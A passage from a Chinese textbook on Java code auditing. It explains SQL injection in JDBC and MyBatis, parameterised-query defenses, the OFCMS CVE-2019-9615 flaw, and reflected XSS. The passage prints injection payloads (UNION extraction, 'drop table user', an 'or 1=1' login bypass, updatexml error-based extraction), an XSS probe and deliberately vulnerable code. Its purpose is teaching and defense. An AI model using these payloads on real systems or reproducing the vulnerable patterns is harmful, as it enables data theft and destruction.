\u8BE5\u6848\u4F8B\u4E2D\u672A\u5BF9\u53C2\u6570id\u8FDB\u884C\u4E25\u683C\u8FC7\u6EE4\uFF0C\u5E76\u5C06id\u62FC\u63A5\u81F3\u4E86SQL\u8BED\u53E5\u6267\u884C\u3002\u53C2\u6570id\u4F20\u9012\u7684\u503C\u4E3A2 and 1=2 union select version(),user(),database(),5\u540E\uFF0CSQL\u8BED\u53E5\u5C06\u88AB\u62FC\u63A5\u4E3A\uFF1Aselect * from corps where id = 2 and 1=2 union select version(),user(),database(),5\u3002\u6267\u884C\u6210\u529F\u540E\uFF0C\u6570\u636E\u5E93\u7684\u7248\u672C\u3001\u7528\u6237\u540D\u3001\u540D\u79F0\u5C06\u6253\u5370\u81F3\u524D\u53F0\u9875\u9762\uFF0C\u7ED3\u679C\u5982\u56FE13-4\u6240\u793A\u3002\r
\r
**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image602.gif)**\r
\r
\u56FE13-4 \u62FC\u63A5SQL\u4EE3\u7801\r
\r
### 13.2.2 Mybatis\u7684SQL\u6CE8\u5165\r
\r
Java EE\u76EE\u524D\u5F00\u53D1\u8FC7\u7A0B\u5DF2\u7ECF\u5F88\u5C11\u4F7F\u7528JDBC\u8FDB\u884C\u6570\u636E\u5E93\u8FDE\u63A5\uFF0C\u76EE\u524D\u4E3B\u6D41\u7684\u6301\u4E45\u5C42\u6846\u67B6\u662FMybatis\uFF0C\u5B83\u652F\u6301\u81EA\u5B9A\u4E49SQL\u3001\u5B58\u50A8\u8FC7\u7A0B\u4EE5\u53CA\u9AD8\u7EA7\u6620\u5C04\u3002Mybatis\u514D\u9664\u4E86\u51E0\u4E4E\u6240\u6709\u7684JDBC\u4EE3\u7801\u4EE5\u53CA\u8BBE\u7F6E\u53C2\u6570\u548C\u83B7\u53D6\u7ED3\u679C\u96C6\u7684\u5DE5\u4F5C\uFF0C\u5176\u53EF\u4EE5\u901A\u8FC7\u7B80\u5355\u7684XML\u6216\u6CE8\u89E3\u6765\u914D\u7F6E\u548C\u6620\u5C04\u539F\u59CB\u7C7B\u578B\u3001\u63A5\u53E3\u3002\r
\r
\uFF081\uFF09   Mybatis\u7684\u57FA\u7840SQL\u6CE8\u5165\u6F0F\u6D1E\r
\r
Mybatis\u5C06\u6570\u636E\u5E93\u6267\u884C\u8BED\u53E5\u62BD\u8C61\u4E3AXML\u6587\u4EF6\uFF0C\u4F8B\u5982\uFF1A\u7528\u6237\u7BA1\u7406\u529F\u80FD\u7684\u6587\u4EF6\u540D\u79F0\u4E3A\uFF1AUserDao.xml\uFF0C\u800C\u57FA\u4E8EMybatis\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u51FA\u73B0\u5728\u8BE5XML\u6587\u4EF6\u4E2D\u3002\u4E0B\u9762\u4EE3\u7801\u4E3A\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u7684XML\u6587\u4EF6\u5185\u5BB9\uFF0C\u53C2\u6570username\u901A\u8FC7\u7B26\u53F7\u201C\${}\u201D\u5F62\u5F0F\u76F4\u63A5\u5C06\u53D8\u91CF\u62FC\u63A5\u81F3SQL\u8BED\u53E5\u4E2D\u5E76\u6267\u884C\uFF0C$\u5C06\u4F20\u5165\u7684\u6570\u636E\u76F4\u63A5\u663E\u793A\u751F\u6210\u5728SQL\u4E2D\u3002\r
\r
\u4F8B\u5982\uFF1Awhere username=\${username}\uFF0C\u5982\u679C\u4F20\u5165\u7684\u503C\u662F111\uFF0C\u90A3\u4E48\u89E3\u6790\u6210SQL\u65F6\u7684\u503C\u4E3Awhere username=111\uFF1B\u5982\u679C\u4F20\u5165\u7684\u503C\u662F;drop table user;\uFF0C\u5219\u89E3\u6790\u6210\u7684SQL\u8BED\u53E5\u4E3A\uFF1Aselect id, username, password, role from user where username=;drop table user;\u3002\u62FC\u63A5\u6210\u7684SQL\u8BED\u53E5\u4E0D\u4EC5\u6267\u884C\u4E86\u67E5\u8BE2\u64CD\u4F5C\uFF0C\u540C\u65F6\u8FD8\u5220\u9664\u4E86user\u8868\u3002\r
\r
\r
\r
<select id="selectByPrimaryName" resultMap="BaseResultMap" parameterType="java.lang.String">\r
\r
\u200B    select\r
\r
\u200B    <include refid="Base_Column_List">\r
\r
\u200B    from tb_admin\r
\r
**//\u4F7F\u7528$\u7B26\u53F7\u5C06username\u76F4\u63A5\u62FC\u63A5\u4E3ASQL\u8BED\u53E5\uFF0C\u5B58\u5728\u6F0F\u6D1E**\r
\r
\u200B    where username = **\${username}**\r
\r
</select>\r
\r
\r
\r
\u5F53\u653B\u51FB\u8005\u4F7F\u7528Payload\u4E3A\u201Cusername='1212' or '1'='1' LIMIT 0,1&password=2223\u201D\u5373\u53EF\u901A\u8FC7\u4E07\u80FD\u5BC6\u7801\u6210\u529F\u767B\u5F55\u7CFB\u7EDF\uFF0C\u901A\u8FC7BurpSuite\u8FDB\u884C\u6D4B\u8BD5\u7684\u6570\u636E\u5305\u5982\u56FE13-5\u6240\u793A\uFF0C\u5176\u8FD4\u56DE\u72B6\u6001\u4E3A1\uFF0C\u8BF4\u660E\u767B\u5F55\u6210\u529F\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image604.jpg)\r
\r
\u56FE13-5 \u6293\u53D6\u7684\u6570\u636E\u5305\u56FE\r
\r
\uFF082\uFF09   Mybatis\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u9632\u5FA1\r
\r
\u901A\u8FC7\u4F7F\u7528\u7B26\u53F7\u201C#{}\u201D\u5C06\u6267\u884C\u7684SQL\u8BED\u53E5\u8FDB\u884C\u9884\u7F16\u8BD1\uFF0C\u4ECE\u800C\u4F7F\u5F97\u4F20\u9012\u53C2\u6570\u65E0\u6CD5\u88AB\u5F53\u4F5CSQL\u8BED\u53E5\u6267\u884C\u3002\u7B26\u53F7\u201C#\u201D\u5C06\u4F20\u5165\u7684\u6570\u636E\u90FD\u5F53\u6210\u5B57\u7B26\u4E32\uFF0C\u5E76\u81EA\u52A8\u4E3A\u4F20\u5165\u6570\u636E\u6DFB\u52A0\u53CC\u5F15\u53F7\u4FDD\u62A4\u3002\u4ECE\u800C\u6709\u6548\u7684\u9632\u5FA1SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
\u4F8B\u5982\uFF1Awhere username=#{username}\uFF0C\u5982\u679C\u4F20\u5165\u7684\u503C\u4E3A111\uFF0C\u5176\u89E3\u6790\u6210SQL\u8BED\u53E5\u65F6\u7684\u503C\u4E3Awhere username="111"\uFF0C\u5982\u679C\u4F20\u5165\u7684\u503C\u662Fid\uFF0C\u5219\u89E3\u6790\u6210\u7684sql\u4E3Awhere username="id"\u3002\r
\r
\r
\r
<select id="selectByPrimaryName" resultMap="BaseResultMap" parameterType="java.lang.String">\r
\r
\u200B    select\r
\r
\u200B    <include refid="Base_Column_List">\r
\r
\u200B    from tb_admin\r
\r
**//\u4F7F\u7528#\u7B26\u53F7\u5C06username\u8FDB\u884C\u9884\u7F16\u8BD1\uFF0C\u9632\u5FA1SQL\u6CE8\u5165\u6F0F\u6D1E**\r
\r
\u200B    where username = **#{username}**\r
\r
</select>\r
\r
\r
\r
\uFF083\uFF09   Mybatis\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u6848\u4F8B\r
\r
\u5728\u57FA\u4E8EMybatis\u6846\u67B6\u7684Java\u767D\u76D2\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\u4E2D\uFF0C\u901A\u5E38\u5C06\u7740\u624B\u70B9\u5B9A\u4F4D\u5728Mybatis\u7684\u914D\u7F6E\u6587\u4EF6\u4E2D\u3002\u901A\u8FC7\u67E5\u770B\u8FD9\u4E9B\u4E0E\u6570\u636E\u5E93\u4EA4\u4E92\u7684\u914D\u7F6E\u6587\u4EF6\u6765\u786E\u5B9ASQL\u8BED\u53E5\u4E2D\u662F\u5426\u5B58\u5728\u62FC\u63A5\u60C5\u51B5\u3002\u901A\u8FC7\u603B\u7ED3\uFF0CMybatis\u6846\u67B6\u4E0B\u6613\u4EA7\u751FSQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u60C5\u51B5\u5305\u62EC\uFF1A\u6A21\u7CCA\u67E5\u8BE2like\u3001in\u67E5\u8BE2\u3001order by\u6392\u5E8F\u3002\r
\r
l \u6A21\u7CCA\u67E5\u8BE2like\r
\r
like\u4E0D\u80FD\u76F4\u63A5\u4F7F\u7528\u9884\u7F16\u8BD1\uFF0C\u5982\u679C\u5728\u672A\u5904\u7406\u597D\u53C2\u6570\u7684\u60C5\u51B5\u4E0B\u8FDB\u884C\u4F20\u5165\uFF0C\u5C06\u53EF\u80FD\u4EA7\u751FSQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u4F7F\u7528Mybatis\u8FDB\u884C\u6A21\u7CCA\u67E5\u8BE2\uFF0C\u5982\u679C\u8003\u8651\u5B89\u5168\u7F16\u7801\u89C4\u8303\u95EE\u9898\uFF0C\u5176\u5BF9\u5E94\u7684SQL\u8BED\u53E5\u5982\u4E0B\uFF1A\r
\r
\r
\r
select id="findlike" resultType="com.test.domain.User" parameterType="string">\r
\r
\u200B    select * from user where name like  **'%#{name}%'****\uFF0C**\r
\r
  </select>\r
\r
\r
\r
\u4F46\u662F\u4E0A\u8FF0\u4EE3\u7801\u8FD0\u884C\u65F6\uFF0C\u4EE3\u7801\u5C06\u4F1A\u629B\u51FA\u5F02\u5E38\uFF0C\u56E0\u6B64\u7814\u53D1\u4EBA\u5458\u5C06SQL\u67E5\u8BE2\u8BED\u53E5\u4FEE\u6539\u5982\u4E0B\uFF1A\r
\r
\r
\r
select id="findlike" resultType="com.test.domain.User" parameterType="string">\r
\r
\u200B    select * from user where name like  **'****%\${name}%'\uFF0C**\r
\r
  </select>\r
\r
\r
\r
\u5728\u8FD9\u79CD\u60C5\u51B5\u4E0B\u7A0B\u5E8F\u867D\u4E0D\u518D\u62A5\u9519\uFF0C\u4F46$\u7B26\u53F7\u4E0D\u4F1A\u81EA\u52A8\u4E3A\u53D8\u91CF\u6DFB\u52A0\u53CC\u5F15\u53F7\u4FDD\u62A4\uFF0C\u4ECE\u800C\u5B58\u5728SQL\u8BED\u53E5\u62FC\u63A5\u95EE\u9898\u3002\u5982\u679CJava\u4EE3\u7801\u5C42\u9762\u6CA1\u6709\u5BF9\u7528\u6237\u8F93\u5165\u7684\u5185\u5BB9\u505A\u5904\u7406\u5C06\u4F1A\u4EA7\u751FSQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
l in\u67E5\u8BE2\r
\r
in\u67E5\u8BE2\u539F\u7406\u4E0Elike\u67E5\u8BE2\u539F\u7406\u76F8\u540C\uFF0C\u5F53\u7528\u6237\u8F93\u51651001,1002,1003\u2026100N\u65F6\uFF0C\u5982\u679C\u8003\u8651\u5B89\u5168\u7F16\u7801\u89C4\u8303\u95EE\u9898\uFF0C\u5176\u5BF9\u5E94\u7684SQL\u8BED\u53E5\u5982\u4E0B\uFF1A\r
\r
\r
\r
Select * from news where id in **(#{id})****\uFF0C**\r
\r
\r
\r
\u4F46\u8FD9\u6837\u5199\u7A0B\u5E8F\u4F1A\u62A5\u9519\uFF0C\u7814\u53D1\u4EBA\u5458\u4F1A\u5C06SQL\u67E5\u8BE2\u8BED\u53E5\u4FEE\u6539\u4E3A\uFF1A\r
\r
\r
\r
Select * from news where id in **(\${id})****\uFF0C**\r
\r
\r
\r
\u4FEE\u6539SQL\u8BED\u53E5\u4E4B\u540E\uFF0C\u7A0B\u5E8F\u505C\u6B62\u62A5\u9519\uFF0C\u4F46\u662F\u5374\u5F15\u5165\u4E86SQL\u8BED\u53E5\u62FC\u63A5\u7684\u95EE\u9898\uFF0C\u5982\u679C\u7814\u53D1\u4EBA\u5458\u6CA1\u6709\u5BF9\u7528\u6237\u8F93\u5165\u7684\u5185\u5BB9\u505A\u8FC7\u6EE4\u5C06\u4F1A\u4EA7\u751FSQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
l order by\u6392\u5E8F\r
\r
\u5F53\u6839\u636E\u53D1\u5E03\u65F6\u95F4\u3001\u70B9\u51FB\u91CF\u7B49\u4FE1\u606F\u5BF9\u65B0\u95FB\u8FDB\u884C\u6392\u5E8F\u7684\u65F6\u5019\uFF0C\u5982\u679C\u8003\u8651\u5B89\u5168\u7F16\u7801\u89C4\u8303\u95EE\u9898\uFF0C\u5176\u5BF9\u5E94\u7684SQL\u8BED\u53E5\u5982\u4E0B\uFF1A\r
\r
\r
\r
Select * from news where title =\u2018\u65B0\u95FB\u2019 order by **#{time}** asc\uFF0C\r
\r
\r
\r
\u4F46\u7531\u4E8E\u53D1\u5E03\u65F6\u95F4time\u4E0D\u662F\u7528\u6237\u8F93\u5165\u7684\u53C2\u6570\uFF0C\u65E0\u6CD5\u4F7F\u7528\u9884\u7F16\u8BD1\u3002\u7814\u53D1\u4EBA\u5458\u5C06SQL\u67E5\u8BE2\u8BED\u53E5\u4FEE\u6539\u5982\u4E0B\uFF1A\r
\r
\r
\r
Select * from news where title =\u2018\u65B0\u95FB\u2019 order by **\${time}** asc\uFF0C\r
\r
\r
\r
\u4FEE\u6539\u4E4B\u540E\uFF0C\u7A0B\u5E8F\u901A\u8FC7\u9884\u7F16\u8BD1\uFF0C\u4F46\u662F\u4EA7\u751F\u4E86SQL\u8BED\u53E5\u62FC\u63A5\u95EE\u9898\u5C06\u53EF\u80FD\u5F15\u53D1SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
### 13.2.3   Java\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u9632\u5FA1\r
\r
Java\u4EE3\u7801\u4E2DSQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u4FEE\u590D\u65B9\u5F0F\u4E3B\u8981\u5305\u62EC\u7684\u65B9\u5F0F\u5982\u4E0B\uFF1A\r
\r
l \u4E3AWeb\u6DFB\u52A0\u5168\u5C40\u8FC7\u6EE4\u5668\r
\r
\u5728Web\u5E94\u7528\u4E2DWeb.xml\u6587\u4EF6\u4E2D\u6DFB\u52A0\u5168\u5C40\u8FC7\u6EE4\u5668SQLFilter\uFF0C\u4ECE\u800C\u8FC7\u6EE4\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\u4E2D\u7684\u7279\u6B8A\u5B57\u7B26\uFF0C\u5728Web.xml\u6587\u4EF6\u4E2D\u6DFB\u52A0\u7684\u5185\u5BB9\u5982\u4E0B\uFF1A\r
\r
\r
\r
<filter>\r
\r
<filter-name>SQLFilter</filter-name>  //\u8FC7\u6EE4\u5668\u7684\u540D\u79F0\r
\r
<filter-clsss>user.Filter.SQLFilter</filter-class> //\u8FC7\u6EE4\u5668\u4F7F\u7528java\u6587\u4EF6\r
\r
</filter>\r
\r
<filter-mapping>\r
\r
<filter-name>SQLFilter</filter-name> //\u8FC7\u6EE4\u5668\u7684\u540D\u79F0\r
\r
<url-pattern>/*</url-pattern>     //\u8FC7\u6EE4\u5668\u62E6\u622A\u7684\u8BF7\u6C42\uFF0C\u62E6\u622A\u6240\u6709\u8BF7\u6C42\r
\r
</filter-mapping>\r
\r
\r
\r
\u4E0A\u8FF0XML\u6587\u4EF6\u4E2D\u6DFB\u52A0\u4E86\u8FC7\u6EE4\u5668SQLFilter\uFF0C\u8BE5\u8FC7\u6EE4\u5668\u662F\u4E00\u4E2A\u540D\u4E3ASQLFilter.java\u7684\u6587\u4EF6\uFF0C\u5176\u4E3B\u8981\u7528\u6765\u8FC7\u6EE4\u7279\u6B8A\u5B57\u7B26\u5305\u62EC\uFF1A||\u3001and\u3001or\u3001select\u7B49\uFF0C\u4EE3\u7801\u5185\u5BB9\u5982\u56FE13-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image606.gif)\r
\r
\u56FE13-6 \u8FC7\u6EE4\u5668\u4EE3\u7801\u56FE\r
\r
l \u4F7F\u7528\u9884\u7F16\u8BD1\u7684\u65B9\u5F0F\u9632\u5FA1SQL\u6CE8\u5165\r
\r
\u9488\u5BF9\u4E8EJDBC\u8FDE\u63A5\u6570\u636E\u5E93\u7684\u60C5\u51B5\uFF0C\u4F7F\u7528\u9884\u7F16\u8BD1\u7684\u65B9\u5F0F\u53EF\u4EE5\u6709\u6548\u7684\u9632\u5FA1SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u672A\u8FDB\u884CSQL\u6CE8\u5165\u9632\u5FA1\u7684\u4EE3\u7801\uFF1A\r
\r
\r
\r
public User login(Connection con,User user) throws Exception{\r
   User resultUser = null;\r
   **String sql = "select \\* from t_user where userName='"+user.getUserName()+"' and password = '"+user.getPassword()+"'";         //****\u62FC\u63A5\u6570\u636E\u5E93SQL\u8BED\u53E5\r
**   java.sql.StateMent stmt = con.createStatement();\r
\r
ResultSet res = stmt.executeQuery(sql);        //\u6267\u884C\u6570\u636E\u5E93SQL\u8BED\u53E5\r
   if(res.next()){\r
     resultUser=new User();\r
     resultUser.setUserName(res.getString("userName"));\r
     resultUser.setPassword(res.getString("password"));\r
   }\r
   return resultUser;\r
 }\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4F7F\u7528\u53D8\u91CFjava.sql.Statement\u8FDB\u884C\u6570\u636E\u5E93\u8FDE\u63A5\u5E76\u6267\u884CSQL\u8BED\u53E5\uFF0C\u5176\u53EF\u80FD\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
\u9632\u5FA1\u65B9\u6CD5\u662F\u5C06\u53D8\u91CFStatement\u4FEE\u6539\u4E3APreparedStatement\uFF0C\u4ECE\u800C\u9884\u7F16\u8BD1SQL\u8BED\u53E5\u3002\u540C\u65F6\uFF0C\u7F16\u5199SQL\u8BED\u53E5\u65F6\u4F7F\u7528\u5360\u4F4D\u7B26\u201C?\u201D\u4EE3\u66FF\u5B57\u6BB5\u7684\u503C\uFF0C\u4ECE\u800C\u53EF\u4EE5\u56FA\u5B9Asql\u8BED\u53E5\u683C\u5F0F\u3002\r
\r
\r
\r
public User login(Connection con,User user) throws Exception{\r
\r
  User resultUser = null;\r
\r
   **String sql = "select \\* from t_user where userName=? and password = ?";**\r
\r
  **PreparedStatement pstmt = con.prepareStatement(sql);//\u5C06sql\u8BED\u53E5\u8FDB\u884C\u9884\u7F16\u8BD1**\r
\r
  **pstmt.setString(1,user.getUserName());       //sql****\u8BED\u53E5\u8BBE\u7F6E\u7528\u6237\u540D**\r
\r
  **pstmt.setString(2,user.getPassword());       //sql\u8BED\u53E5\u8BBE\u7F6E\u5BC6\u7801**\r
\r
  ResultSet rs = pstmt.executeQuery();        //\u6267\u884Csql\u8BED\u53E5\r
\r
  if(rs.next()){\r
\r
\u200B    resultUser=new User();\r
\r
\u200B    resultUser.setUserName(rs.getString("userName"));\r
\r
\u200B    resultUser.setPassword(rs.getString("password"));\r
\r
  }\r
\r
  return resultUser;\r
\r
}\r
\r
\r
\r
### 13.2.4   OFCMS\u5E73\u53F0SQL\u6CE8\u5165\u6F0F\u6D1E\u5206\u6790\r
\r
\uFF081\uFF09\u6F0F\u6D1E\u5206\u6790\r
\r
CVE-2019-9615\u6F0F\u6D1E\u51FA\u73B0\u4E8EOFCMS\u5E73\u53F0V1.1.3\u7248\u672C\u4E4B\u524D\uFF0C\u8BE5\u5E73\u53F0\u662F\u57FA\u4E8EJava\u6280\u672F\u5F00\u53D1\u7684\u5185\u5BB9\u7BA1\u7406\u7CFB\u7EDF\uFF0C\u5F53\u7528\u6237\u8BBF\u95EE\u8DEF\u5F84\u4E3A\u201Cadmin/system/generate/create?sql=xxx\u201D\u65F6\uFF0C\u5C06\u8C03\u7528\u8BE5\u5E73\u53F0\u7684\u201C\u4EE3\u7801\u751F\u6210\u201D\u529F\u80FD\uFF0C\u5982\u56FE13-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image608.gif)\r
\r
\u56FE13-7 OFCMS\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u529F\u80FD\u70B9\r
\r
\u8BE5\u529F\u80FD\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u5176\u5BF9\u5E94\u7684\u6587\u4EF6\u4F4D\u4E8E\\ofcms-admin\\src\\main\\java\\com\\ofsoft\\cms\\admin\\controller\\system\\SystemGenerateController.java\u5904\u3002\u4E0B\u9762\u7ED9\u51FA\u8BE5\u6587\u4EF6\u4EE3\u7801\uFF1A\r
\r
\r
\r
//\u63A5\u6536HTTP\u8BF7\u6C42\u8DEF\u5F84\u4E3A/system/generate\r
\r
@Action(path = "/system/generate", viewPath = "system/generate/")\r
 public class SystemGenerateController extends BaseController {\r
\r
public void create() {\r
    try {\r
     String sql = getPara("sql");//\u83B7\u53D6HTTP\u8BF7\u6C42\u7684\u53C2\u6570sql\r
     Db.update(sql);       //\u6839\u636E\u53C2\u6570sql\u66F4\u65B0\u6570\u636E\u5E93\r
     rendSuccessJson();     //\u53D1\u9001\u6210\u529F\u7684Json\r
    } catch (Exception e) {    //\u5F02\u5E38\u5904\u7406\r
     e.printStackTrace();\r
     rendFailedJson(ErrorCode.get("9999"), e.getMessage());\r
    }\r
  }\r
 }\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4F7F\u7528getPara()\u51FD\u6570\u83B7\u53D6\u53C2\u6570SQL\uFF0C\u7136\u540E\u8C03\u7528Db.update(SQL)\u76F4\u63A5\u6267\u884Csql\u8BED\u53E5\uFF0C\u8FD4\u56DEjson\u683C\u5F0F\u7684\u6570\u636E\u3002\u8BE5\u7A0B\u5E8F\u5BF9\u4F20\u5165\u7684\u53C2\u6570\u672A\u8FDB\u884C\u8FC7\u6EE4\u5C31\u76F4\u63A5\u6267\u884C\uFF0C\u4ECE\u800C\u9020\u6210SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
\uFF082\uFF09\u6F0F\u6D1E\u5229\u7528\r
\r
\u5F53\u4F7F\u7528\u6D4B\u8BD5\u7684Payload\u4E3Aupdate of_cms_link set link_name='panda' where link_id = 4\u65F6\uFF0C\u4F7F\u7528BurpSuite\u62E6\u622AHTTP\u8BF7\u6C42\uFF0C\u5E76\u4F7F\u7528SQL\u6267\u884C\u76D1\u63A7\u5DE5\u5177\u53D1\u73B0\u5176\u5E76\u672A\u5BF9SQL\u8BED\u53E5\u8FDB\u884C\u8F6C\u4E49\u6216\u8FC7\u6EE4\uFF0C\u5982\u56FE13-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image610.gif)\r
\r
\u56FE13-8 SQL\u8BED\u53E5\u6267\u884C\u76D1\u63A7\u56FE\r
\r
\u7531\u4E8E\u8BE5\u529F\u80FD\u70B9\u53EA\u652F\u6301update\u8BED\u53E5\uFF0C\u53EF\u4F7F\u7528\u62A5\u9519\u578BSQL\u6CE8\u5165\u3002\u4E3A\u8BE5CMS\u6784\u9020Payload\u4E3A\uFF1Aupdate of_cms_link set link_name=updatexml(1,concat(0x7e,(user())),0) where link_id = 4\u3002\u6267\u884C\u6210\u529F\u540E\u9875\u9762\u5C06\u6253\u5370\u76EE\u524D\u4F7F\u7528\u7684\u7528\u6237\u540D\u4E3A\u201Czengcms\u201D\uFF0C\u5982\u56FE13-9\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image612.gif)\r
\r
\u56FE13-9 OFCMS SQL\u6CE8\u5165\u6F0F\u6D1E\u56FE\r
\r
## 13.3 Java\u4EE3\u7801\u4E2D\u7684XSS\u6F0F\u6D1E\r
\r
### 13.3.1 Java\u4E2D\u7684XSS\u6F0F\u6D1E\r
\r
\uFF081\uFF09  \u53CD\u5C04\u578BXSS\r
\r
PHP\u4EE3\u7801\u4E2D\u4F1A\u4F7F\u7528echo\u5BF9\u7528\u6237\u8F93\u5165\u53C2\u6570\u76F4\u63A5\u8F93\u51FA\u5BFC\u81F4xss\u6F0F\u6D1E\u3002\u800C\u5728Java\u4E2D\u5C06\u63A5\u6536\u5230\u7684\u672A\u7ECF\u8FC7\u6EE4\u53C2\u6570\u5171\u4EAB\u5230request\u5BF9\u8C61\u4E2D\uFF0C\u5E76\u5728JSP\u9875\u9762\u91CC\u9762\u4F7F\u7528EL\u8868\u8FBE\u5F0F\u8FDB\u884C\u8F93\u51FA\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FAJava\u4E2D\u7684XSS\u6F0F\u6D1E\u6848\u4F8B\uFF0CXSS\u7684Servlet\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
@WebServlet("/demo")\r
\r
public class xssServlet extends HttpServlet {\r
\r
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
\u200B    this.doGet(request,response);\r
\r
  }\r
\r
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
\u200B    response.setContentType("text/html");// \u8BBE\u7F6E\u54CD\u5E94\u7C7B\u578B\r
\r
\u200B    String content = **request.getParameter("content");/**/\u83B7\u53D6content\u4F20\u53C2\u6570\u636E\r
\r
\u200B    **request.setAttribute("content", content);**  //content\u5171\u4EAB\u5230request\u57DF\u4E2D\r
\r
\u200B    request.getRequestDispatcher("**/WEB-INF/pages/xss.jsp**").forward(request, response); //\u8F6C\u53D1\u5230xxs.jsp\u9875\u9762\u4E2D\r
\r
  }}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u5904\u7406\u8BF7\u6C42URL\u4E3A\u201C/demo\u201D\uFF1B\r
\r
l xssServlet\u7C7B\u7EE7\u627FHttpServlet\u7C7B\uFF0C\u53EF\u5904\u7406GET\u53CAPOST\u8BF7\u6C42\uFF1B\r
\r
l doGet\u65B9\u6CD5\u4E2D\uFF0C\u5C06\u83B7\u53D6HTTP\u53C2\u6570content\u5E76\u5C06\u8BE5\u53C2\u6570\u7684\u503C\u653E\u7F6E\u5230request\u5BF9\u8C61\u4E2D\uFF1B\r
\r
l \u5C06request\u5BF9\u8C61\u8F6C\u53D1\u5230/WEB-INF/pages/xss.jsp\u9875\u9762\u4E2D\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA/WEB-INF/pages/xss.jsp\u9875\u9762\u4EE3\u7801\uFF1A\r
\r
\r
\r
<%@ page contentType="text/html;charset=UTF-8" language="java" %>\r
\r
<html>\r
\r
<head>\r
\r
  <title>Title</title>\r
\r
  **\${requestScope.content}//****\u5C06request\u5BF9\u8C61\u4E2D\u7684content\u5185\u5BB9\u663E\u793A\u81F3\u524D\u53F0\u9875\u9762**\r
\r
</head>\r
\r
</html>\r
\r
\r
\r
\u4E0A\u8FF0\u7A0B\u5E8F\u5C06\u54CD\u5E94\u5185\u5BB9\${requestScope.content}\u6253\u5370\u81F3\u9875\u9762\u3002\u7528\u6237\u542F\u52A8Tomcat\u670D\u52A1\u5668\u540E\uFF0C\u8BBF\u95EEURL\u4E3Ahttp://localhost/test/demo?content=1\uFF0C\u53EF\u5C06\u540E\u53F0\u503Ccontent\u4E3A1\u6253\u5370\u81F3\u9875\u9762\u3002\r
\r
\u82E5\u7528\u6237\u8F93\u5165http://localhost/test/demo?content=<script>alert("xss")<\/script>\uFF0C\u5219\u53EF\u4EE5\u5C06JS\u4EE3\u7801<script>alert("xss")<\/script>\u6253\u5370\u81F3\u9996\u9875\u5E76\u6210\u529F\u5F39\u7A97\uFF0C\u5982\u56FE13-10\u6240\u793A\u3002Java\u4EE3\u7801\u5BA1\u8BA1XSS\u6F0F\u6D1E\u65F6\uFF0C\u540C\u6837\u4E5F\u9700\u8981\u5173\u6CE8\u53C2\u6570\u662F\u5426\u53EF\u63A7\u7684\u95EE\u9898\u3002\u5982\u679C\u4F20\u5165\u53C2\u6570\u53EF\u63A7\uFF0C\u5219\u8BE5\u53C2\u6570\u5C06\u5171\u4EAB\u5230request\u4E2D\u5E76\u663E\u793A\u81F3\u524D\u53F0\u9875\u9762\uFF0C\u5C31\u53EF\u80FD\u5B58\u5728XSS\u6F0F\u6D1E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image614.jpg)\r
\r
\u56FE13-10 Java\u53CD\u5C04XSS\u56FE\r
\r
\uFF082\uFF09  \u5B58\u50A8\u578BXSS\r
\r
\u4E0EPHP\u4EE3\u7801\u5BA1\u8BA1\u7C7B\u4F3C\uFF0CJava\u4E2D\u7684\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u540C\u6837\u7531\u4E8E\u4F20\u9012\u53C2\u6570\u88AB\u7528\u6237\u53EF\u63A7\uFF0C\u4E14\u53C2\u6570\u5728\u4F20\u9012\u8FC7\u7A0B\u4E2D\u672A\u7ECF\u8FC7\u6709\u6548\u8FC7\u6EE4\uFF0C\u4ECE\u800C\u5C06\u6076\u610F\u811A\u672C\u5B58\u50A8\u5728\u6570\u636E\u5E93\u4E2D\uFF0C\u5F53\u524D\u53F0\u663E\u793A\u6570\u636E\u5E93\u4E2D\u6570\u636E\u65F6\u5C06\u6267\u884C\u6076\u610F\u7684JS\u811A\u672C\uFF0C\u5176\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
public String adduser() throws IOException{\r
\r
//\u5B9A\u4E49HTTP\u8BF7\u6C42\u5BF9\u8C61request\r
   HttpServletRequest request = ServletActionContext.getRequest();\r
\r
